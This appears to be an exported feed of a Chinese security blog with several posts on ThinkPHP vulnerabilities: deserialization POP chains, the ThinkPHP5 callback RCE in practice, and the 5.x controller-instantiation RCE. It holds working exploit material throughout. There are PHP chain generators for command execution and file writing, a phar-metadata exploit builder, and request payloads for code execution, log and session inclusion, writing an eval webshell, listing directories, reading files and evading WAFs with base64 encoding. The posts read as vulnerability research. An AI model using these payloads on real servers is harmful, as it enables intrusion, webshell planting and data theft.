class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918142310829.png" alt="image-20240918142310829" /></p><h3 id="三-其他反序列化链分析-2"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析-2"></a> 三、其他反序列化链分析</h3><p>分析一下另一个写文件的利用链</p><p>上面分析过_toString的触发，这里找一下toString的其他利用位置：</p><p>下图中的类是可以走到__call方法的</p><p><img src="../../../typora-user-images/image-20240918100505845.png" alt="image-20240918100505845" /></p><p>__call方法的利用点就多了，继续找一下</p><p>output类可以调用任意类的write方法。</p><p><img src="../../../typora-user-images/image-20240918105538579.png" alt="image-20240918105538579" /></p><p>跟入到file类，依旧是任意类的write方法，但是第一个参数已经可控了。第二个参数会是我们上面write传的第一个messages参数。（就是最初触发点的参数）</p><p><img src="../../../typora-user-images/image-20240918105748941.png" alt="image-20240918105748941" /></p><p>接下来继续找两个参数的write方法。file类完美符合要求。</p><p><img src="../../../typora-user-images/image-20240918110305467.png" alt="image-20240918110305467" /></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  namespace think\model\concern&#123;      trait Attribute&#123;          private $data &#x3D; [&#39;test&#39;];     &#125;  &#125;  namespace think\view\driver&#123;      class Php&#123;&#125;  &#125;namespace think\session\driver&#123;    class File&#123;    &#125;&#125;namespace League\Flysystem&#123;    class File&#123;        protected $path;        protected $filesystem;        public function __construct($File)&#123;            $this-&gt;path&#x3D;&#39;test.php&#39;;            $this-&gt;filesystem&#x3D;$File;        &#125;    &#125;&#125;namespace think\console&#123;    use League\Flysystem\File;    class Output&#123;        protected $styles&#x3D;[];        private $handle;        public function __construct($File)&#123;            $this-&gt;styles[]&#x3D;&#39;getDomainBind&#39;;            $this-&gt;handle&#x3D;new File($File);        &#125;    &#125;&#125;  namespace think&#123;      abstract class Model&#123;          use model\concern\Attribute;          private $lazySave;          protected $withEvent;          protected $table;          function __construct($cmd,$File)&#123;              $this-&gt;lazySave &#x3D; true;              $this-&gt;withEvent &#x3D; false;              $this-&gt;table &#x3D; new route\Url(new Middleware,new console\Output($File),$cmd);          &#125;      &#125;      class Middleware&#123;          public $request &#x3D; 2333;      &#125;   &#125;  namespace think\model&#123;      use think\Model;      class Pivot extends Model&#123;&#125;   &#125;  namespace think\route&#123;      class Url      &#123;          protected $url &#x3D; &#39;a:&#39;;          protected $domain;          protected $app;          protected $route;          function __construct($app,$route,$cmd)&#123;              $this-&gt;domain &#x3D; $cmd;              $this-&gt;app &#x3D; $app;              $this-&gt;route &#x3D; $route;          &#125;      &#125;  &#125;  namespace&#123;      echo base64_encode(serialize(new think\Model\Pivot(&#39;&lt;?php phpinfo(); exit(); ?&gt;&#39;,new think\session\driver\File)));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5thinkphp61x反序列化"><a class="markdownIt-Anchor" href="#5thinkphp61x反序列化"></a> ⑤ThinkPHP6.1.x反序列化</h2><p>测试版本6.1.4</p><p>tp6.0的链可以通用</p><ul><li>命令执行</li></ul><p><img src="../../../typora-user-images/image-20240918142423600.png" alt="image-20240918142423600" /></p><ul><li><p>写文件</p><p>6.1 版本默认不携带Flysytem类，导致上面分析的写文件链无法再次使用。</p><p><img src="../../../typora-user-images/image-20240918143955561.png" alt="image-20240918143955561" /></p></li></ul><p><img src="../../../typora-user-images/image-20240918143857435.png" alt="image-20240918143857435" /></p><h2 id="6thinkphp80x反序列化"><a class="markdownIt-Anchor" href="#6thinkphp80x反序列化"></a> ⑥ThinkPHP8.0.x反序列化</h2><p><a href="https://xz.aliyun.com/t/14904">https://xz.aliyun.com/t/14904</a></p><p>暂时不自己分析了，可以看一下这篇文章，其实上面分析了这么多条链。自己挖掘也就很简单了</p><p>文章中也是toString走到call，然后走到callback的sink点，完成了利用。</p><p>主要难点在于if条件的构造，确实是个麻烦的大工程。</p><p>顺带推荐一个题目：强网杯pop_master</p><h1 id="0x02-实战利用"><a class="markdownIt-Anchor" href="#0x02-实战利用"></a> 0x02 实战利用</h1><p>刚开始学反序列化的时候一直有疑问，tp的反序列化漏洞如何利用呢？？为什么网络上都是分析pop链，而很少有实战的例子呢？</p><p>其实这也就引出了反序列化漏洞的前提：</p><ul><li>存在反序列化pop链</li><li>存在反序列化的入口，也就是接收数据并进行反序列化的操作。</li></ul><p>因为tp实质上是一个框架，所以你并不知道开发者可能如何写业务，如果业务中涉及到处理对象，那就很有可能写了反序列化的入口。</p><p>总结一下，实战中的入口主要有如下：</p><h2 id="原生反序列化"><a class="markdownIt-Anchor" href="#原生反序列化"></a> 原生反序列化</h2><p>字面意思</p><p>php自带的unserialize方法</p><p><img src="../../../typora-user-images/image-20240918151516506.png" alt="image-20240918151516506" /></p><h2 id="redis模块"><a class="markdownIt-Anchor" href="#redis模块"></a> Redis模块</h2><p>既然自带了unserialize方法，那么我们去tp框架搜索一下该方法，有没有什么方法是封装了这个函数的呢？</p><ul><li>不难发现redis模块的get方法获取键值的时候是调用反序列化方法的</li></ul><p>值以think_serialize开始会进行反序列化</p><p><img src="../../../typora-user-images/image-20240918152247395.png" alt="image-20240918152247395" /></p><p><strong>当然高版本的get方法实现起来又不一样了，tp6是另一套写法，tp5这个实战比较多，就拿这个举例了</strong></p><h2 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h2><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>ctf比较常见</p><p>当然实战中也有产品能遇到，比如：<strong>瑞友天翼应用虚拟化</strong></p><h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h2><p>phar反序列化是实战中的大头，先简单总结一下，phar文件的metadata部分存储的是反序列化数据，当使用phar协议处理文件时，会对这部分数据进行反序列化。（<strong>PHP8已经做了修复</strong>）</p><p>主要影响的函数就是文件操作相关的。</p><p><img src="../../../typora-user-images/20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p><p>实际上很好理解：</p><ol><li>生成恶意的phar文件。（后缀无要求）</li></ol><p>代码上半部分是上面分析的pop链。</p><p>下半部分重点把metadata部分设置成pop链的对象即可。</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think &#123;        abstract class Model &#123;                private $lazySave &#x3D; false;        private $data &#x3D; [];        private $exists &#x3D; false;        protected $table;        private $withAttr &#x3D; [];        protected $json &#x3D; [];        protected $jsonAssoc &#x3D; false;                public function __construct($obj&#x3D;&#39;&#39;) &#123;            $this-&gt;lazySave &#x3D; true;            $this-&gt;data &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;calc&#39;]];            $this-&gt;exists &#x3D; true;            $this-&gt;table &#x3D; $obj;                $this-&gt;withAttr &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;system&#39;]];            $this-&gt;json &#x3D; [&#39;calc&#39;];            $this-&gt;jsonAssoc &#x3D; true;        &#125;    &#125;&#125;namespace think\model &#123;    use think\Model;    class Pivot extends Model &#123;    &#125;   &#125;namespace&#123;        $p &#x3D; new \think\model\Pivot(new \think\model\Pivot());    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;代码里面必须是phar后缀，生成完使用伪协议触发不需考虑后缀    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub    $phar-&gt;setMetadata($p); &#x2F;&#x2F;自定义metadata    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F; 添加文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>伪协议触发（实战中需要自己尝试上传文件）</li></ol><p><img src="../../../typora-user-images/image-20240918161944044.png" alt="image-20240918161944044" /></p><p><strong>分析到这里也能看到，我们代码中必须是整个参数都可以控制，这样才能控制phar前缀</strong></p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a></p><p><a href="https://www.anquanke.com/post/id/251318#h2-2">https://www.anquanke.com/post/id/251318#h2-2</a></p><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><p><a href="https://xz.aliyun.com/t/11382">https://xz.aliyun.com/t/11382</a></p><p><a href="https://xz.aliyun.com/t/9310">https://xz.aliyun.com/t/9310</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-反序列化利用链&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-反序列化利用链&quot;&gt;&lt;/a&gt; 0x01 反序列化利用链&lt;/h1&gt;
&lt;h2 id=&quot;审计思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hr</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5-Rce实战篇</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:10:18.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a class="markdownIt-Anchor" href="#序"></a> 序</h1><p>首先说的这个rce是callback的那个rce，这个洞实战遇见了几次，感觉有几点很有意思，因此记录一下</p><h1 id="0x01-漏洞验证"><a class="markdownIt-Anchor" href="#0x01-漏洞验证"></a> 0x01 漏洞验证</h1><ol><li>网上的很多工具都采用这种方式做漏洞验证，但是这种并没有考虑phpinfo被disable</li></ol><p><strong>aaaaa</strong>=<strong>phpinfo</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240918164858827.png" alt="image-20240918164858827" /></p><ol start="2"><li><p>xray采用了var_dump的方式，但判断条件写的有些问题，直接匹配字符，导致很多误报。</p></li><li><p>其实可以在xray的方式上做优化</p></li></ol><ul><li>添加规则，判断string和length关键字等等</li></ul><p><img src="../../../typora-user-images/image-20240918165333020.png" alt="image-20240918165333020" /></p><ul><li>再套一层filter，用常规md5计算（环境都是没开debug的，因此默认也能用）</li></ul><p><strong>aaaaa</strong>=<strong>123456</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>md5</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240919094205025.png" alt="image-20240919094205025" /></p><h1 id="0x02-漏洞利用"><a class="markdownIt-Anchor" href="#0x02-漏洞利用"></a> 0x02 漏洞利用</h1><h2 id="一-assert无法使用"><a class="markdownIt-Anchor" href="#一-assert无法使用"></a> 一、assert无法使用</h2><p>众所周知，php7的assert变成非函数了，也就无法callback调用，达到执行任意代码的效果，这样利用起来就很麻烦了。</p><p>可以尝试更换其他函数，如system等命令执行函数。</p><p><strong>甚至你可以使用unserialize，结合pop链做漏洞利用</strong></p><h2 id="二-文件包含利用"><a class="markdownIt-Anchor" href="#二-文件包含利用"></a> 二、文件包含利用</h2><p>这个在实战中经常使用</p><h3 id="日志包含"><a class="markdownIt-Anchor" href="#日志包含"></a> 日志包含</h3><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;data&#x2F;runtime&#x2F;log&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>控制器报错没有记录到日志里面（?s=)，因此可以直接用这个洞，callback的调用位置给加上payload</p><p><strong>aaaaa</strong>=<strong>&lt;</strong>?<strong>php</strong> <strong>phpinfo</strong>();?&gt;&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="../../../typora-user-images/image-20240918171433593.png" alt="image-20240918171433593" /></p><p><img src="../../../typora-user-images/image-20240918171628457.png" alt="image-20240918171628457" /></p><h3 id="session包含"><a class="markdownIt-Anchor" href="#session包含"></a> session包含</h3><p>设置session</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;c&#39;])?&gt;&amp;server[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918172313542.png" alt="image-20240918172313542" /></p><p>linux存tmp</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_ID&amp;c&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows看实际情况</p><p><img src="../../../typora-user-images/image-20240918172450829.png" alt="image-20240918172450829" /></p><h4 id="实战遇到的问题"><a class="markdownIt-Anchor" href="#实战遇到的问题"></a> *实战遇到的问题：</h4><p>实战中我们可能考虑使用这种写shell的方式</p><p><img src="../../../typora-user-images/image-20240918181907270.png" alt="image-20240918181907270" /></p><p>但是我们发现我们写入的session文件变样了</p><p><img src="../../../typora-user-images/image-20240918182839115.png" alt="image-20240918182839115" /></p><p>跟一下tp的代码：</p><p>发现字段会以. 做区分，因此我们上面的文件名会分隔开</p><p><img src="../../../typora-user-images/image-20240918182918927.png" alt="image-20240918182918927" /></p><p><img src="../../../typora-user-images/image-20240918183023873.png" alt="image-20240918183023873" /></p><p>换个写shell方式即可</p><p><img src="../../../typora-user-images/image-20240918183107326.png" alt="image-20240918183107326" /></p><h2 id="三-其他利用"><a class="markdownIt-Anchor" href="#三-其他利用"></a> 三、其他利用</h2><h3 id="列目录"><a class="markdownIt-Anchor" href="#列目录"></a> 列目录</h3><p><strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>scandir</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>GET</strong>&amp;<strong>get</strong>[]=<strong>/</strong></p><p>可以利用payload读取目录</p><ul><li>一是可以根据这个payload判断系统是否为linux（windows默认会列当前盘符跟目录）</li></ul><p><img src="../../../typora-user-images/image-20240918172825785.png" alt="image-20240918172825785" /></p><ul><li>二是可以通过payload寻找日志和session等，配合文件读取，可以做的事情很多</li></ul><h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件"></a> 读文件</h3><p>配合列目录可以做的事情有很多，在极端环境下可以拿到很多东西</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>highlight_file<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240918173108619.png" alt="image-20240918173108619" /></p><h1 id="0x03-waf绕过"><a class="markdownIt-Anchor" href="#0x03-waf绕过"></a> 0x03 waf绕过</h1><p>日志包含的时候，关键字被拦截怎么办？</p><ul><li>编码写入</li></ul><p>利用上面的思路，编码写入shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method=__construct&amp;method=get&amp;filter=think\Session::set&amp;get[]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"OTE4LnBocA=="</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PD9waHAgcGhwaW5mbygpOz8%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>关键函数过滤</li></ul><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p><p>这篇文章采取了伪协议+字符反转的方式绕过关键字</p><p>如果校验了php标签之类的，那么payload就只能编码写进去，后面就要结合伪协议利用了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name class-name-fully-qualified static-context">think<span class="token punctuation">\</span>Session</span><span class="token operator">::</span><span class="token constant">set</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYWJjJ10pKTs<span class="token operator">/</span>Pg<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240919100313292.png" alt="image-20240919100313292" /></p><p>这里的bb是为了补充base64的位数，后面使用伪协议decode时候可以正确解码到payload。因为session格式是固定的。</p><p><img src="../../../typora-user-images/20221011121738-a44e4b00-491b-1.png" alt="20221011121738-a44e4b00-491b-1" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p><a href="https://xz.aliyun.com/t/10397">https://xz.aliyun.com/t/10397</a></p><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#序&quot;&gt;&lt;/a&gt; 序&lt;/h1&gt;
&lt;p&gt;首先说的这个rce是callback的那个rce，这个洞实战遇见了几次，感觉有几点很有意思，因此记录一下&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞验证&quot;</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP框架默认RCE漏洞分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:08:30.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-启"><a class="markdownIt-Anchor" href="#0x00-启"></a> 0x00 启</h1><p>黑盒debug开启会报错出具体版本</p><p>白盒看本地tp代码</p><p>tp3 在目录的ThinkPHP文件中</p><p><img src="../../../typora-user-images/image-20240716150129242.png" alt="image-20240716150129242" /></p><p>TP5.0在目录的base.php文件中 : thinkphp/base.php</p><p><img src="../../../typora-user-images/image-20240716165942332.png" alt="image-20240716165942332" /></p><p>TP5.1: thinkphp/library/think/App.php</p><p><img src="../../../typora-user-images/image-20240725155723023.png" alt="image-20240725155723023" /></p><h1 id="0x01-thinkphp-2x-命令执行"><a class="markdownIt-Anchor" href="#0x01-thinkphp-2x-命令执行"></a> 0x01 ThinkPHP 2.x 命令执行</h1><p>PHP5的preg_replace的/e模式的命令执行</p><p><img src="../../../typora-user-images/image-20240716155011163.png" alt="image-20240716155011163" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'正则规则'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'替换字符'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'目标字符'</span><span class="token punctuation">)</span>    正则规则使用e修饰时，如果从目标字符匹配到正则规则，那么替换字符的php语句就会执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个分析过程参考这篇文章即可，实战几乎没遇见过TP2，以后有空再分析吧：<a href="https://www.freebuf.com/articles/people/223149.html">https://www.freebuf.com/articles/people/223149.html</a></p><h1 id="0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"><a class="markdownIt-Anchor" href="#0x02-thinkphp-5x-命令执行兼容模式支持实例化任意控制器导致rce"></a> 0x02 ThinkPHP 5.x 命令执行（兼容模式支持实例化任意控制器导致RCE）</h1><h2 id="1影响版本"><a class="markdownIt-Anchor" href="#1影响版本"></a> 1.影响版本</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.22</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.30</p><p>patch方式：</p><p>添加正则判断controller名</p><p><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p>5.0<img src="../../../typora-user-images/image-20240716162407625.png" alt="image-20240716162407625" /></p><p><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p>5.1</p><p><img src="../../../typora-user-images/image-20240725151852349.png" alt="image-20240725151852349" /></p><h2 id="2漏洞分析"><a class="markdownIt-Anchor" href="#2漏洞分析"></a> 2.漏洞分析</h2><p>本地调试环境版本为5.0.22</p><p>补丁判断了控制器只允许有字母数字</p><p>先跟一下5.0.22的$controller都做了什么</p><p>访问index.php</p><ul><li>因为没有传入控制器，默认的控制器是Index</li><li>默认配置$convert为true，会将控制器名小写处理</li></ul><p><img src="../../../typora-user-images/image-20240723173927452.png" alt="image-20240723173927452" /></p><p><strong>分析流程：</strong></p><ol><li>进入下方的parseName静态方法</li></ol><ul><li>做的是名称风格转换，就是驼峰、首字母大写和蛇形的编码名称的转换，不是核心问题</li></ul><p><img src="../../../typora-user-images/image-20240723174505492.png" alt="image-20240723174147581" /></p><ol start="2"><li>进入下方的操作$controller变量的位置，跟入Loader的controller静态方法</li></ol><p><img src="../../../typora-user-images/image-20240724175539279.png" alt="image-20240724175539279" /></p><p><img src="../../../typora-user-images/image-20240723174521168.png" alt="image-20240723174521168" /></p><ol start="3"><li>看注释发现是实例化控制器的，传入的形参为$name，跟入下方的getModuleAndClass静态方法</li></ol><p><img src="../../../typora-user-images/image-20240723174847375.png" alt="image-20240723174847375" /></p><ol start="4"><li>两个if，第一个判断传入的控制器名字是否包含’\‘字符，不包含的话会走下面的else，下面会判断是否存在’/‘字符，存在会按照’/'字符分割返回。</li></ol><p><img src="../../../typora-user-images/image-20240723175203807.png" alt="image-20240723175203807" /></p><ol start="5"><li>跟入下方赋值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">的</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">class的parseClass方法，参数为我们上面取得的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">的</span></span></span></span>module和$name（控制器名称）</li></ol><p>关注下下面做了什么</p><ul><li>替换name中的/和. 再按照字符划分为数组</li><li>parseName我们上面分析过，是做名称转换的（驼峰、首字母大写和蛇形），返回数组最后一个元素</li><li>根据配置，看后缀是否配置，将后缀拼接到$class名字中</li><li>将去掉最后元素的原始数组拼接回字符</li></ul><p>返回值：返回命名空间+模块+层名+类名+类名后缀</p><p><img src="../../../typora-user-images/image-20240723181604729.png" alt="image-20240723181604729" 